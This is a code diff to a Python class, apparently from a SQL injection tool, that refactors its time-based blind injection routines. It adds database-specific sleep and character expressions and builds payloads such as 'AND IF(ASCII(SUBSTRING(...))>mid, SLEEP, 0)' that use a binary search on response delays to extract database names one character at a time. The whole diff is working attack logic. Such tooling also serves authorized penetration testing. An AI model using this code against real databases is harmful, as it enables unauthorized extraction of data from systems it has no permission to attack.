@@ -36,15 +36,16 @@ class TimeInjector:
 
         r_normal = self.requester.send({param: ctx.prefix + "AND 1=1" + ctx.suffix})
 
+        # Get the database-specific expression to sleep
         sleep_expression = fingerprints[database_engine.lower()].sleep
         if sleep_expression is None:
             return False
 
-        delay_expression = sleep_expression.format(seconds=self.sleep)
-        self.sleep_expression = delay_expression
+        formatted_sleep_expression = sleep_expression.format(seconds=self.sleep)
+        self.sleep_expression = formatted_sleep_expression
 
         r_sleep = self.requester.send(
-            {param: f"{ctx.prefix}AND {delay_expression}{ctx.suffix}"}
+            {param: f"{ctx.prefix}AND {formatted_sleep_expression}{ctx.suffix}"}
         )
 
         return self.analyzer.is_delayed(r_normal, r_sleep, self.sleep)
@@ -91,6 +92,7 @@ class TimeInjector:
 
     def get_db_elem_name(
         self,
+        database_engine: str,
         param: str,
         ctx: InjectionContext,
         expression: str,
@@ -106,6 +108,11 @@ class TimeInjector:
 
         expr_name = ""
 
+        # Get the database-specific expression to handle characters
+        char_expression = fingerprints[database_engine.lower()].char
+        if char_expression is None:
+            return ""
+        
         # Non-delaying baseline. The condition is always false, so SLEEP()
         # is never executed.
         r_baseline = self.requester.send(
@@ -120,12 +127,14 @@ class TimeInjector:
             while low < high:
                 mid = (low + high) // 2
 
+                formatted_char_expression = char_expression.format(expression=expression, digit=digit)
+
                 # If the character at this position has an ASCII value
                 # greater than mid, the database introduces a delay.
                 payload = (
                     f"{ctx.prefix}"
                     f"AND IF("
-                    f"ASCII(SUBSTRING({expression},{digit},1))>{mid},"
+                    f"{formatted_char_expression}>{mid},"
                     f"{self.sleep_expression},0)"
                     f"{ctx.suffix}"
                 )
@@ -144,6 +153,7 @@ class TimeInjector:
 
     def get_db_elem_name_chars_at_index(
         self,
+        database_engine: str,
         param: str,
         ctx: InjectionContext,
         expression: str,
@@ -156,6 +166,11 @@ class TimeInjector:
         over printable ASCII values. The response time indicates whether
         the tested ASCII comparison is true or false.
         """
+
+        # Get the database-specific expression to handle characters
+        char_expression = fingerprints[database_engine.lower()].char
+        if char_expression is None:
+            return []
 
         found_chars: list[str] = []
 
@@ -172,12 +187,14 @@ class TimeInjector:
             while low < high:
                 mid = (low + high) // 2
 
+                formatted_char_expression = char_expression.format(expression=expression, digit=digit)
+
                 # Trigger the delay only when the character's ASCII value
                 # is greater than the midpoint.
                 payload = (
                     f"{ctx.prefix}"
                     f"AND IF("
-                    f"ASCII(SUBSTRING({expression},{digit},1))>{mid},"
+                    f"{formatted_char_expression}>{mid},"
                     f"{self.sleep_expression},0)"
                     f"{ctx.suffix}"
                 )
